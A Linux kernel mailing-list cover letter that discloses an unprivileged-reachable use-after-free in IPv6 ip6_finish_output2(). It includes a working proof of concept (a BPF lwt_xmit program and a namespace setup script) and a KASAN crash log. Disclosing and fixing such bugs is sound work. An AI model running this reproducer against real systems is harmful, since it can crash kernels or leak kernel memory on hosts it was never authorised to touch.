Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2DD214334CE
	for <netdev@vger.kernel.org>; Wed, 12 Aug 2026 12:54:40 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786539282; cv=none; b=CtrvsLKzZ7chxqRzjxraIF+7UzEdyhrvU85DX8Fz7OGgn+qBH0hqyeB71m2WF9Yy+BduwGXsFRQ1cMP+8HC502XuaO3WUx5Z5oIT5svmW4C5M3gVf1y5FBZDDFVX9WYfsvZ7zzJRkLdcw99Li/KuTf2k8nDWC6gu/eRYbp7yZo8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786539282; c=relaxed/simple;
	bh=QFJQl3UdOc9S8ztxeeT8OUlT/6OgKwSWPHFonzJZtn0=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=kz0ImDxH+zHG5gHFV0Nx4/0oefEoxU675koLpg4GOwY4ZHT1g7jfsXu/3yBCIkUgNMGgKSHWDuA/JW3ACT6+u0CDLNAAe1/biU5XhNYvitdDqYbPhQ3FoevAgCsynVKEili6+1GLJyMPaW9wjvXdyDACgCGH7E0Tw5ZzU7OSNic=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Jy3pYT0r; arc=none smtp.client-ip=209.85.210.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Jy3pYT0r"
Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-8487214ad2bso1413617b3a.1
        for <netdev@vger.kernel.org>; Wed, 12 Aug 2026 05:54:40 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1786539280; x=1787144080; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=w7fEzJZhe768DM1J2hxDfGQ2Y2Eiwbfi1oG+RTOlrjg=;
        b=Jy3pYT0rBEnqxMRV+YdSBWM6rMtYeyr9YuFZ7QspmLULlNL5QFdzl+lmmx+cM243z0
         9aFVlGkeKVriCO3l8RuIiyRU6r3DEBozKurUS7CwL2aFUDIE+Kie9olmgs6RRZKPknbD
         NmXvDT39EM6hMoTffM4vghJ/me6VQ4+/cF0tChrJ6UyEpPnxKcziEK1DIcOkbUpZffmu
         RL+8+Y40tvTM/9lqiVbyw3dkdHK2w2X71q4lRfMlNMHTln0UxnKv2CsoJbOKvSAnKps2
         1llCHOLBdcfF2C4EE1oRCN7TZkuziMNhIBVh9gXEv2LrIrImbaA8L4kv5gJcxpxA7K+N
         NPrQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786539280; x=1787144080;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=w7fEzJZhe768DM1J2hxDfGQ2Y2Eiwbfi1oG+RTOlrjg=;
        b=GV1iwr56NDQlw5bJULGh09EoCMjSrwkfOgHf4gP0+kk7B3lIFuP9nXoxK31zqbXSQp
         SplT2mcucNKAKHHMazFcxwB8jr46zghVEgRYytmLQIXBPa6HG//wvvq/Vq4Kbiy77zuk
         VVDwXrTHDPYEQkTZAtBtGom2PPw6ji589vZobJaQHwIQ4ehEvG3FL4LXrcmQuUgvZTCm
         A33cugzW5M1Um/7QE0eGG8KrbYdqsgySGj2q5GFpkWtRgYzlfbLoFfY6d0XbIdulVYZG
         ELMe+7rZ7K1jlwhN5pePF0a0SpAL63PMs1RvByEk19b2UAZxaf21CHQNDoNr6+YI4TvG
         gg1g==
X-Gm-Message-State: AOJu0YwhJJDXis58jO5+pgJlM4EGerQpyi6Zwpe4EVj78wQQnrV+uetR
	NP9jvW2jh+/xifq3DSBok7gAVTq2S/o5UMacnjxw1ZOTnxW8qUDyqXIhzyWIY6rUqKgi71XVLvK
	wunpzrdQh
X-Gm-Gg: AR+sD13pGguJwJ/Q5e/O2RpeCnCBFoK623VzZuGANfZ+s6pJ2TGT9D8as5tlQNqe85T
	ltIrPGYRk8/h/Q1q/bukbqrQAiuv/6Ch+BJlpaBrk/wrwL7fKtr0CQwRJS1ZOF7s5fdaCgX5UKx
	Tr8J2WE1XLdxXFvTjKGL6qHzbAU+sGoKCJzdqgTiEibPYa6K0lU2/76w/mCzNG2fG/4BT0InyGh
	RZVh3mUW9F7gl0kaANFfoNoJMJxnleLa9D3OMam2a9nLamXmnsBjTaCXoVXx/HZnqFrlV4Hkyz2
	XypFXf5+Uu2jCFTFb4bDBGRquSLWqW9LZ8VjCmJZWTlIsbGJPfkoKfQ4uwY+hXZ/bSGZuY+LpnP
	E6obfSHtNpnLRvT0Fdx3gwO6gsLXIZ4HAez50nsCsAhjH0M7M+iiyb548iZzHM+tNYRNfA/db9i
	1+8KiOCWX7zEK5iDkoX1oRn+F9ukLvUy06Khn2aA+ECjqFmA4gEyUxUlzSw3Ygv/VzyXi4Lw==
X-Received: by 2002:a05:6a00:2283:b0:848:77b2:20a with SMTP id d2e1a72fcca58-84fb55a9fd9mr4866121b3a.39.1786539280088;
        Wed, 12 Aug 2026 05:54:40 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84fb1f71ee5sm959037b3a.57.2026.08.12.05.54.31
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 12 Aug 2026 05:54:39 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vasily.averin@linux.dev,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] ipv6: fix use-after-free in ip6_finish_output2
Date: Wed, 12 Aug 2026 20:54:37 +0800
Message-ID: <cover.1786516730.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv6/ip6_output.c. The bug is reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ip6_finish_output2() caches a pointer to the IPv6 destination address (daddr) from the skb head before calling lwtunnel_xmit(). An attached LWT-BPF program can reallocate the skb head via helpers like bpf_skb_change_head() or pskb_expand_head() during xmit, invalidating the cached daddr. When lwtunnel_xmit() returns LWTUNNEL_XMIT_CONTINUE, the function proceeds to use the stale daddr for nexthop computation and neighbour lookup, resulting in a use-after-free read. This can leak kernel memory, pollute the neighbour table, misdirect traffic, or crash the kernel.

Reproducer:

    # Compile BPF program (requires bpftool or clang)
    clang -O2 -target bpf -c poc.bpf.c -o poc.bpf.o
    # Run the PoC in a network namespace
    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.bpf.c------

// SPDX-License-Identifier: GPL-2.0
#include <linux/bpf.h>

#define SEC(name) __attribute__((section(name), used))

static long (*const bpf_skb_change_head)(struct __sk_buff *skb, __u32 len,
					 __u64 flags) =
	(void *)BPF_FUNC_skb_change_head;

SEC("lwt_xmit")
int trigger_stale_daddr(struct __sk_buff *skb)
{
	if (bpf_skb_change_head(skb, 4096, 0))
		return BPF_DROP;

	return BPF_OK;
}

char LICENSE[] SEC("license") = "GPL";

------END poc.bpf.c--------

------BEGIN poc.sh------

#!/bin/sh
set -eu

OBJ="${1:-./poc.bpf.o}"
DEV0="veth0"
DEV1="veth1"
SRC6="2001:db8:1::1/64"
DST6="2001:db8:1::99/128"
PING6="2001:db8:1::99"

ip link del "${DEV0}" 2>/dev/null || true

ip link add "${DEV0}" type veth peer name "${DEV1}"
ip link set lo up
ip link set "${DEV0}" up
ip link set "${DEV1}" up
ip -6 addr add "${SRC6}" dev "${DEV0}" nodad
ip -6 route replace "${DST6}" dev "${DEV0}" encap bpf xmit obj "${OBJ}" sec lwt_xmit

ping -6 -c 1 -W 1 "${PING6}" || true

------END poc.sh--------

----BEGIN crash log----

[   70.131903][ T9339] =========================================================
[   70.132689][ T9339] BUG: KASAN: slab-use-after-free in ip6_finish_output2+0x0
[   70.134334][ T9339] Read of size 4 at addr ffff888033f55d70 by task ping/9339
[   70.135239][ T9339] 
[   70.135604][ T9339] CPU: 0 UID: 0 PID: 9339 Comm: ping Not tainted 7.0.0-rc6 
[   70.135614][ T9339] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
[   70.135632][ T9339] Call Trace:
[   70.135646][ T9339]  <TASK>
[   70.135649][ T9339]  dump_stack_lvl+0x10e/0x1f0
[   70.135752][ T9339]  print_report+0xf7/0x600
[   70.135806][ T9339]  ? preempt_count_sub+0x13/0xd0
[   70.135851][ T9339]  ? __virt_addr_valid+0x1ab/0x330
[   70.135891][ T9339]  ? __phys_addr+0x41/0x90
[   70.135913][ T9339]  ? ip6_finish_output2+0x2bf/0x1010
[   70.135922][ T9339]  kasan_report+0xe4/0x120
[   70.135931][ T9339]  ? ip6_finish_output2+0x2bf/0x1010
[   70.135939][ T9339]  ip6_finish_output2+0x2bf/0x1010
[   70.135947][ T9339]  ? lock_release+0x225/0x2f0
[   70.135967][ T9339]  ? __rcu_read_unlock+0x4b/0x340
[   70.135985][ T9339]  __ip6_finish_output+0x20b/0x7f0
[   70.135994][ T9339]  ip6_output+0x182/0x540
[   70.136001][ T9339]  ? __pfx_ip6_output+0x10/0x10
[   70.136009][ T9339]  ip6_local_out+0x9e/0x160
[   70.136042][ T9339]  ip6_send_skb+0xc3/0x330
[   70.136050][ T9339]  ip6_push_pending_frames+0x3b/0x50
[   70.136058][ T9339]  rawv6_sendmsg+0x224f/0x3060
[   70.136070][ T9339]  ? __pfx_rawv6_sendmsg+0x10/0x10
[   70.136076][ T9339]  ? avc_has_perm_noaudit+0x12b/0x370
[   70.136134][ T9339]  ? avc_has_perm+0x141/0x1f0
[   70.136141][ T9339]  ? __pfx_avc_has_perm+0x10/0x10
[   70.136151][ T9339]  ? __might_fault+0x8c/0xd0
[   70.136179][ T9339]  ? should_fail_ex+0x85/0x310
[   70.136223][ T9339]  ? __pfx_rawv6_sendmsg+0x10/0x10
[   70.136229][ T9339]  ? inet_sendmsg+0xda/0xe0
[   70.136261][ T9339]  ? __pfx_rawv6_sendmsg+0x10/0x10
[   70.136266][ T9339]  inet_sendmsg+0xda/0xe0
[   70.136274][ T9339]  __sys_sendto+0x392/0x3f0
[   70.136298][ T9339]  ? __pfx_inet_sendmsg+0x10/0x10
[   70.136305][ T9339]  ? __pfx___sys_sendto+0x10/0x10
[   70.136312][ T9339]  ? __do_sys_capset+0xfb/0x3e0
[   70.136327][ T9339]  ? selinux_file_ioctl+0x101/0x230
[   70.136341][ T9339]  ? selinux_file_ioctl+0x108/0x230
[   70.136351][ T9339]  __x64_sys_sendto+0x76/0x90
[   70.136357][ T9339]  do_syscall_64+0x116/0x800
[   70.136377][ T9339]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   70.136420][ T9339] RIP: 0033:0x7fba32042046
[   70.136439][ T9339] Code: 0e 0d 00 f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b89
[   70.136445][ T9339] RSP: 002b:00007fff5741b4d8 EFLAGS: 00000246 ORIG_RAX: 00c
[   70.136459][ T9339] RAX: ffffffffffffffda RBX: 00007fff5741c820 RCX: 00007fb6
[   70.136471][ T9339] RDX: 0000000000000040 RSI: 000055a06814dd50 RDI: 00000003
[   70.136474][ T9339] RBP: 000055a06814dd50 R08: 00007fff5741ea34 R09: 0000000c
[   70.136478][ T9339] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ff8
[   70.136482][ T9339] R13: 0000000000000040 R14: 00007fff5741c820 R15: 00000011
[   70.136488][ T9339]  </TASK>
[   70.136490][ T9339] 
[   70.162867][ T9339] Allocated by task 9339:
[   70.163255][ T9339]  kasan_save_stack+0x33/0x60
[   70.163686][ T9339]  kasan_save_track+0x14/0x30
[   70.164099][ T9339]  __kasan_slab_alloc+0x89/0x90
[   70.164557][ T9339]  kmem_cache_alloc_node_noprof+0x270/0x700
[   70.165102][ T9339]  kmalloc_reserve+0xee/0x1f0
[   70.165547][ T9339]  __alloc_skb+0x172/0x470
[   70.165943][ T9339]  __ip6_append_data+0x27ab/0x2ab0
[   70.166396][ T9339]  ip6_append_data+0xd6/0x2d0
[   70.166938][ T9339]  rawv6_sendmsg+0x11a0/0x3060
[   70.167371][ T9339]  inet_sendmsg+0xda/0xe0
[   70.167763][ T9339]  __sys_sendto+0x392/0x3f0
[   70.168190][ T9339]  __x64_sys_sendto+0x76/0x90
[   70.168590][ T9339]  do_syscall_64+0x116/0x800
[   70.169039][ T9339]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   70.169537][ T9339] 
[   70.169761][ T9339] Freed by task 9339:
[   70.170119][ T9339]  kasan_save_stack+0x33/0x60
[   70.170584][ T9339]  kasan_save_track+0x14/0x30
[   70.171019][ T9339]  kasan_save_free_info+0x3b/0x60
[   70.171502][ T9339]  __kasan_slab_free+0x5f/0x80
[   70.171937][ T9339]  kfree+0x2e2/0x6c0
[   70.172273][ T9339]  skb_free_head+0x74/0xd0
[   70.172666][ T9339]  pskb_expand_head+0x272/0x8d0
[   70.173089][ T9339]  bpf_skb_change_head+0x1a2/0x540
[   70.173553][ T9339]  bpf_prog_85045ea84ae36807_trigger_stale_daddr+0x20/0x37
[   70.174216][ T9339]  run_lwt_bpf.isra.0+0x2a9/0x7d0
[   70.174779][ T9339]  bpf_xmit+0xc1/0x240
[   70.175156][ T9339]  lwtunnel_xmit+0x1eb/0x570
[   70.175571][ T9339]  ip6_finish_output2+0x933/0x1010
[   70.176041][ T9339]  __ip6_finish_output+0x20b/0x7f0
[   70.176719][ T9339]  ip6_output+0x182/0x540
[   70.177119][ T9339]  ip6_local_out+0x9e/0x160
[   70.177533][ T9339]  ip6_send_skb+0xc3/0x330
[   70.177953][ T9339]  ip6_push_pending_frames+0x3b/0x50
[   70.178416][ T9339]  rawv6_sendmsg+0x224f/0x3060
[   70.178846][ T9339]  inet_sendmsg+0xda/0xe0
[   70.179221][ T9339]  __sys_sendto+0x392/0x3f0
[   70.179626][ T9339]  __x64_sys_sendto+0x76/0x90
[   70.180040][ T9339]  do_syscall_64+0x116/0x800
[   70.180500][ T9339]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   70.181018][ T9339] 
[   70.181235][ T9339] The buggy address belongs to the object at ffff888033f550
[   70.181235][ T9339]  which belongs to the cache skbuff_small_head of size 704
[   70.182598][ T9339] The buggy address is located 48 bytes inside of
[   70.182598][ T9339]  freed 704-byte region [ffff888033f55d40, ffff888033f560)
[   70.183778][ T9339] 
[   70.184006][ T9339] The buggy address belongs to the physical page:
[   70.184629][ T9339] page: refcount:0 mapcount:0 mapping:0000000000000000 ind4
[   70.185432][ T9339] head: order:2 mapcount:0 entire_mapcount:0 nr_pages_mapp0
[   70.186221][ T9339] flags: 0xfff00000000040(head|node=0|zone=1|lastcpupid=0x)
[   70.186919][ T9339] page_type: f5(slab)
[   70.187297][ T9339] raw: 00fff00000000040 ffff88801aec3dc0 dead000000000100 2
[   70.188044][ T9339] raw: 0000000000000000 0000000800130013 00000000f5000000 0
[   70.188819][ T9339] head: 00fff00000000040 ffff88801aec3dc0 dead0000000001002
[   70.189619][ T9339] head: 0000000000000000 0000000800130013 00000000f50000000
[   70.190384][ T9339] head: 00fff00000000002 ffffffffffffff01 00000000fffffffff
[   70.191163][ T9339] head: ffffffffffffffff 0000000000000000 00000000ffffffff4
[   70.191971][ T9339] page dumped because: kasan: bad access detected
[   70.192592][ T9339] page_owner tracks the page as allocated
[   70.193125][ T9339] page last allocated via order 2, migratetype Unmovable, 0
[   70.194907][ T9339]  post_alloc_hook+0xe6/0x100
[   70.195343][ T9339]  get_page_from_freelist+0x55c/0x2210
[   70.195872][ T9339]  __alloc_frozen_pages_noprof+0x221/0x1cb0
[   70.196386][ T9339]  new_slab+0xa2/0x5f0
[   70.196776][ T9339]  refill_objects+0xe3/0x430
[   70.197213][ T9339]  __pcs_replace_empty_main+0x2ed/0x650
[   70.197742][ T9339]  kmem_cache_alloc_node_noprof+0x51c/0x700
[   70.198272][ T9339]  kmalloc_reserve+0xee/0x1f0
[   70.198700][ T9339]  __alloc_skb+0x172/0x470
[   70.199144][ T9339]  inet_ifmcaddr_notify+0xb9/0x1b0
[   70.199638][ T9339]  ____ip_mc_inc_group+0x5dd/0xbe0
[   70.200135][ T9339]  ip_mc_up+0xbe/0x260
[   70.200519][ T9339]  inetdev_event+0x5ab/0x10a0
[   70.200953][ T9339]  notifier_call_chain+0x77/0x320
[   70.201432][ T9339]  call_netdevice_notifiers_info+0x95/0xd0
[   70.201963][ T9339]  __dev_notify_flags+0x118/0x260
[   70.202422][ T9339] page last free pid 6970 tgid 6970 stack trace:
[   70.203001][ T9339]  __free_frozen_pages+0x52d/0x960
[   70.203461][ T9339]  qlist_free_all+0x47/0xf0
[   70.203895][ T9339]  kasan_quarantine_reduce+0x195/0x1e0
[   70.204383][ T9339]  __kasan_slab_alloc+0x69/0x90
[   70.204854][ T9339]  kmem_cache_alloc_noprof+0x23a/0x6d0
[   70.205349][ T9339]  do_getname+0x35/0x290
[   70.205792][ T9339]  do_sys_openat2+0xb8/0x1b0
[   70.206242][ T9339]  __x64_sys_openat+0xf0/0x180
[   70.206710][ T9339]  do_syscall_64+0x116/0x800
[   70.207146][ T9339]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   70.207654][ T9339] 
[   70.207892][ T9339] Memory state around the buggy address:
[   70.208426][ T9339]  ffff888033f55c00: fc fc fc fc fc fc fc fc fc fc fc fc fc
[   70.209152][ T9339]  ffff888033f55c80: fc fc fc fc fc fc fc fc fc fc fc fc fc
[   70.209908][ T9339] >ffff888033f55d00: fc fc fc fc fc fc fc fc fa fb fb fb fb
[   70.210626][ T9339]                                                         ^
[   70.211277][ T9339]  ffff888033f55d80: fb fb fb fb fb fb fb fb fb fb fb fb fb
[   70.212003][ T9339]  ffff888033f55e00: fb fb fb fb fb fb fb fb fb fb fb fb fb
[   70.212787][ T9339] =========================================================

-----END crash log-----

Best regards,
Luxiao Xu

Luxiao Xu (1):
  ipv6: fix use-after-free in ip6_finish_output2()

 net/ipv6/ip6_output.c | 2 ++
 1 file changed, 2 insertions(+)

-- 
2.43.0

